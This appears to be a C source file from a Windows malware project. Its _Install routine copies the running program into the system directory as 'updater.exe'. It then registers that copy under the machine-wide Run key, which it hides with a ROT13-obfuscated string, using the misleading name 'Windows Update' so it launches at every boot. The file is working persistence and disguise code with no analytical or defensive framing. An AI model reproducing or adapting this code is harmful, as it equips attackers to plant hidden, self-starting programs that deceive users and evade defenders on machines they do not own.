#include "data_globals.h"
#include <windows.h>
#include <string.h>

uint32_t _Install(void)
{
    char ModPath[256];
    char SPath[256];
    char TranGU[110];
    DWORD cbData;
    HKEY hKey;

    GetModuleFileNameA(NULL, ModPath, sizeof(ModPath));
    GetSystemDirectoryA(SPath, sizeof(SPath));
    strcat(SPath, "\\updater.exe");
    CopyFileA(ModPath, SPath, FALSE);

    memset(TranGU, 0, sizeof(TranGU));
    _CiphStr(TranGU, "FBSGJNER\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, TranGU, 0, KEY_WRITE, &hKey);
    cbData = strlen(SPath);
    RegSetValueExA(hKey, "Windows Update", 0, REG_SZ, SPath, cbData);
    RegCloseKey(hKey);

    return 0;
}
